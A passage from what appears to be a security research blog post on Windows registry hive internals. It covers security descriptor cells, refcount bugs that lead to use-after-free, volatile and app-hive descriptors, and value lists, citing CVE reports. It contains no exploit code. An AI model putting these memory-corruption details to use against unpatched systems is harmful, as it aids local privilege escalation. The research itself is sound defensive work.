 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;DescriptorLength&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x014&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Descriptor&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_SECURITY_DESCRIPTOR_RELATIVE&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Each of its fields is discussed in more detail in the following subsections.&lt;/span&gt;&lt;/p&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.mfy9mbjgevi6&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c10 MvcjwGOuIU-c31&quot;&gt;Signature&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The magic bytes of this cell type, equal to 0x6B73 (&amp;#39;sk&amp;#39;). It exists for informational purposes only, but isn&amp;#39;t used for anything at runtime &amp;ndash; it isn&amp;#39;t even verified on hive load, and can therefore be anything in a binary-controlled hive.&lt;/span&gt;&lt;/p&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.dwoz22ke8el2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;Reserved&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;An unused field that may contain arbitrary data; never accessed by the kernel.&lt;/span&gt;&lt;/p&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.l1kufiaunyw7&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;Flink and Blink&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As discussed earlier, these are the forward and backward links in the security descriptor list. They must always be kept in a valid state. In a single-element list, Flink/Blink point at themselves &amp;ndash; that is, at the security descriptor they are both part of.&lt;/span&gt;&lt;/p&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.8x3wal5fuqxs&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;ReferenceCount&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This single field was arguably responsible for the most registry-related vulnerabilities out of all of the hive structures. It is a 32-bit unsigned integer that expresses the number of objects that actively rely on this security descriptor, which mostly means the key nodes associated with it, but not only. Whenever this member gets out of sync with the real number of references, it may lead to serious memory corruption primitives, so it is very important that the kernel ensures its correct value both on hive load and during any subsequent operations. The two prevalent risks are that:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_s8ghxl62e844-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;The refcount gets too small:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;when this happens, it is possible that the cell gets freed while some objects still hold active references to it. This leads to a straightforward use-after-free scenario, and in my experience, it is easily exploitable by a local attacker.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;The refcount gets too large:&lt;/span&gt;&lt;span&gt;&amp;nbsp;this situation doesn&amp;#39;t immediately lead to memory corruption, but let&amp;#39;s remember that the structure member has a limited, 32-bit width. If an attacker were able to indiscriminately increment the counter without real references to back it up, they could eventually get it to the maximum uint32 value, 0xFFFFFFFF. For many years, the Windows kernel hasn&amp;#39;t implemented any protection against registry refcount integer overflows, so another incrementation of the field after 0xFFFFFFFF would wrap it back to zero, which brings us to the previous scenario of an inadequately small count. However, following some bug reports and discussions, Microsoft has gradually added overflow protection in the relevant, internal functions, starting in April 2023 and eventually &lt;/span&gt;&lt;span&gt;landing the last missing check in November 2024&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. Thanks to this effort, I believe that as I am writing this, security descriptor refcount leaks should no longer be an exploitable condition.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Under most circumstances, the value of the refcount is somewhere between 1 and ~24.4 million (the maximum number of keys in a hive given the space constraints). However, it is interesting to note that it might be legitimately set to a greater value. Consider the following: immediately after loading a hive, all security &lt;/span&gt;&lt;span&gt;refcounts&lt;/span&gt;&lt;span&gt;&amp;nbsp;are exactly equal to the number of keys associated with them. But, key nodes globally visible in the registry tree are not the only ones that can reference security cells; there may be also keys that have been created in the scope of a transaction and not committed yet, as well as pending, transacted operations of changing the security properties of a key (marked by the UoWAddThisKey and UoWSetSecurityDescriptor enums of type UoWActionType). They too may increase the refcount value beyond what would normally be possible with just regular, non-transacted keys. This phenomenon has been discussed in detail in the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451732&quot;&gt;CVE-2024-43641&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;bug report.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Overall, reference counts are of great importance to system security, and every registry operation that involves it deserves a thorough security assessment.&lt;/span&gt;&lt;/p&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.5rhr08m9my8b&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;DescriptorLength&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;This is the length of the security descriptor data (i.e. the size of the Descriptor array) expressed in bytes. It&amp;#39;s worth noting that the format doesn&amp;#39;t force it to be the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;minimum&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;length sufficient to store the binary blob. This means that the overall cell length must be greater than DescriptorLength + 20 (i.e. the declared length of the descriptor plus the _CM_KEY_SECURITY header), and in turn DescriptorLength must be greater than the actual size of the descriptor. Both cases of the cell size or the DescriptorLength having non-optimal values are accepted by the kernel, and the extra bytes are ignored.&lt;/span&gt;&lt;/p&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.xcmzwshz9wih&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;Descriptor&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;This variable-length array stores the actual security descriptor in the form of the SECURITY_DESCRIPTOR_RELATIVE structure. It doesn&amp;#39;t necessarily have to be formatted in the most natural way, and the only requirement is that it successfully passes the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlvalidrelativesecuritydescriptor&quot;&gt;RtlValidRelativeSecurityDescriptor&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;check&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the RequiredInformation argument set to zero. This means, for example, that the Owner/Group/Sacl/Dacl components may be spread out in memory and have gaps in between them, or conversely, that their representations may overlap. This was one of the main contributing factors in &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451427&quot;&gt;CVE-2022-35768&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, but the fix was to more accurately calculate the length of irregularly-encoded descriptors, and the freedom to structure them in non-standard ways has remained. It is even possible to use a completely empty descriptor without any owner or access control entries, and such a construct will be acknowledged by the system, too.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Another somewhat interesting fact is that security descriptors are meant to be deduplicated, so naturally whenever a user assigns a security descriptor that already exists in the hive, it is simply reused and its reference count is incremented. However, again, the format (or rather its canonical implementation in Windows) doesn&amp;#39;t force the uniqueness requirement upon the security descriptors in hives loaded from disk. So, even though they would be never created by the OS itself, multiple identical copies of a descriptor are allowed in specially crafted hives and may co-exist without (seemingly) causing any issues for the kernel.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;The access rights defined by the security descriptors are based on permissions specific to the registry and its operations, so there is an access mask dedicated to creating keys (KEY_CREATE_SUB_KEY), reading values (KEY_QUERY_VALUE), writing values (KEY_SET_VALUE), and so on. They all have self-descriptive names and are well-documented in &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights&quot;&gt;Registry Key Security and Access Rights&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, so we won&amp;#39;t spend more time discussing them here.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.bfgfaqbruhk4&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Security descriptors of volatile keys&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Similarly to every other property of a registry key, the storage type of a security descriptor always matches the type of its associated key(s). This means that a stable key will always use a stable descriptor, and a volatile key &amp;ndash; a volatile descriptor. It is the only &amp;quot;exception&amp;quot; to the rule that security descriptors are deduplicated and unique within the scope of the hive. If there are two keys with identical security settings but different storage types, they will reference two distinct security descriptor cells via their _CM_KEY_NODE.Security fields, one with the highest bit set and the other with the bit clear. The &lt;/span&gt;&lt;span&gt;descriptors&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;stored on both sides are subject to the same rules with regards to reference counting, allocating and freeing.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Furthermore, we have previously discussed how all security descriptors in a hive are connected in one global doubly-linked list, but this only applies to the descriptors in the stable space. The functionality is needed so that the descriptors can be enumerated by the kernel when loading a hive from disk, and since volatile descriptors are in-memory only and disappear together with their corresponding keys on hive unload or a system shutdown, there is no need to link them together. The internal CmpInsertSecurityCellList function takes this into account, and points the Flink/Blink fields at themselves, making each volatile descriptor a single-entry list in order to keep it compatible with the list linking/unlinking code. This behavior is illustrated in the diagram below, with two volatile security descriptors each being in their own pseudo-list:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFvU_lKPXAXNcaDpkFMhxssobFSIMemew9rQ21RFY-nGjVmKns8vvv60C6dKpxixMtkHG6l_Macrlpck03gUskUCkfq4b-yEXDog6a3gQeP4KhT0vnfmk7SDLoFLVBthjzkH-RiZ7OY5O5YXuTACqGv32p8gbs8zo9cQKD-w2pG6DMmI3ornrG9z9xDLU/s1999/image9.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFvU_lKPXAXNcaDpkFMhxssobFSIMemew9rQ21RFY-nGjVmKns8vvv60C6dKpxixMtkHG6l_Macrlpck03gUskUCkfq4b-yEXDog6a3gQeP4KhT0vnfmk7SDLoFLVBthjzkH-RiZ7OY5O5YXuTACqGv32p8gbs8zo9cQKD-w2pG6DMmI3ornrG9z9xDLU/s1200/image9.png&quot; border=&quot;0&quot; alt=&quot;Diagram described in the paragraph above, showing two security descripitors capybara and sloth&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram described in the paragraph above, showing two security descripitors capybara and sloth&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;This slight quirk is the reason why the ability to create stable keys under volatile ones, which should normally not be possible, may be an exploitable condition with security impact. For details, see the &amp;quot;Creation of stable subkeys under volatile keys&amp;quot; section in the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451512&quot;&gt;CVE-2023-21748&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;bug report, or the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/04_Transacted_stable_under_volatile_keys&quot;&gt;CVE-2024-26173&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;bug report.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.y8671eqji3r0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Security descriptors in app hives&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;In normal registry hives, there are no artificial restrictions with regards to security descriptors. There may be an arbitrary number of them, and they may contain any type of settings the user wishes, as long as they have binary control over the hive file and/or the existing security descriptors grant them the access to change them to whatever they want. However, there are some limitations concerning security descriptors in application hives, as documented in the MSDN page of the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadappkeya&quot;&gt;RegLoadAppKeyA&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;function:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c35&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;All keys inside the hive must have the same security descriptor, otherwise the function will fail. This security descriptor must grant the caller the access specified by the samDesired parameter or the function will fail. You cannot use the RegSetKeySecurity function on any key inside the hive.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c10 MvcjwGOuIU-c13&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;The intent behind the quote seems to be that the security settings within an app hive should be uniform and immutable; that is, remain identical to their initial state at hive creation, and consistent across all keys. There is indeed some truth to the documentation, as trying to change the security of a key within an app hive with &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetkeysecurity&quot;&gt;RegSetKeySecurity&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, or to create a new key with a custom descriptor both result in a failure with STATUS_ACCESS_DENIED. However, the part about all keys having the same security descriptor is not actually enforced, and a user can freely load an app hive with any number of different security descriptors associated with the keys. This was reported to Microsoft as &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/20_App_hive_security_inconsistencies&quot;&gt;WinRegLowSeverityBugs issue #20&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but wasn&amp;#39;t deemed severe enough to be addressed in a security bulletin (which I agree with), so for now, it remains an interesting discrepancy between the documentation and implementation.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.qvnu3wyx38ie&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;Key values and value lists&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;While keys allow software to create a data organization hierarchy, values are the means of actually storing the data. Each value is associated with one specific key, and is characterized by the following properties:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_qst1zha6rauh-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Name&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Type&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Data&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;In general, values are much simpler than keys. To begin with, they are not a full-fledged object in the NT Object Manager sense: you cannot open a handle to a value, and thus you may only access them through the handle of its associated key and its name. They also don&amp;#39;t have dedicated security descriptors, so a client with a key handle with the KEY_QUERY_VALUE access can enumerate and read all values of the key, and the KEY_SET_VALUE rights allows the caller to create/modify/delete all values within a key. For these reasons, values are best thought of as elaborate attributes of a key, not as an independent entity. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;There is no fixed limit on the number of values associated with a key other than the available hive space, which places the number at around 67 million (0x80000000 &amp;divide; 0x20, the hive space divided by the minimum value cell size). The value list format is also not as optimized as the subkey index is: it is a linear, single-level list with just the raw value cell indexes, without any additional metadata like a header or hints. The list is not sorted either, and their order is defined by when they were added to the key. Finally, value name uniqueness is guaranteed on output, but not enforced on input: it is possible to load a specially crafted hive with several values with the same name, and contrary to duplicate keys, this doesn&amp;#39;t seem to pose any fundamental problems for the registry implementation.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;A high-level overview of the hive cells related to a key&amp;#39;s value list is shown below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-kkqHETa7hxjybGBjyP5n8vSsLqW5_62Y5wh6_0TumJfzZ02N3o3EJplOm34WUH2Aosppu38CHWJxaTZ4HWdpcivVAbr7Y60kmawVkTEQaZ47oRr3MuW-3TNhi_9EkySX5d8fBCQQvAGtQIkTpBgSFt8dMCaMKnAaZb160I1epSQtF7oJZeCXBwbLLnI/s1999/image2.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-kkqHETa7hxjybGBjyP5n8vSsLqW5_62Y5wh6_0TumJfzZ02N3o3EJplOm34WUH2Aosppu38CHWJxaTZ4HWdpcivVAbr7Y60kmawVkTEQaZ47oRr3MuW-3TNhi_9EkySX5d8fBCQQvAGtQIkTpBgSFt8dMCaMKnAaZb160I1epSQtF7oJZeCXBwbLLnI/s1200/image2.png&quot; border=&quot;0&quot; alt=&quot;Diagram showing the high-level overview of the hive cells related to a key&amp;#39;s value list&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram showing the high-level overview of the hive cells related to a key&amp;#39;s value list&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;In the next section, we will examine the internal layout and semantics of the _CM_KEY_VALUE structure, which describes each unique value in the registry.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.md1n4l1tdhgp&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;The key value cell&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As usual, we can print out the structure definition in WinDbg:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_CM_KEY_VALUE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;nt!_CM_KEY_VALUE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
